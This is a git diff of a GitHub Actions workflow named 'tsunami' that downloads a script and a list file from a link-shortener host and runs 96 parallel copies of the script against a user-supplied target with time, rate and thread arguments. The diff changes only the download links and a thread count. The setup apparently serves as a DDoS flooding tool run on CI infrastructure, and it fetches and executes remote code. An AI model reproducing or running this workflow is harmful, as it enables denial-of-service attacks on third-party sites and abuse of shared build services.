@@ -1,4 +1,4 @@
-name: tsunami
+name: tsunam
 on:
   workflow_dispatch:
     inputs:
@@ -26,8 +26,8 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/dnHM-/tsu.js
-        wget https://curl.by/BtEN_/good.txt
+        wget https://curl.by/K7oxX/tsu.js
+        wget https://curl.by/3Lcgg/good.txt
         chmod +x tsu.js
         npm i hpack https commander colors socks
     - name: run
@@ -38,7 +38,7 @@ jobs:
         
         PIDS=()
         for i in {1..96}; do
-          sudo timeout $TIME node tsu.js "$TARGET" 95 "$RATE" 10 good.txt
+          sudo timeout $TIME node tsu.js "$TARGET" 95 "$RATE" 12 good.txt
           PIDS+=($!)
         done
         
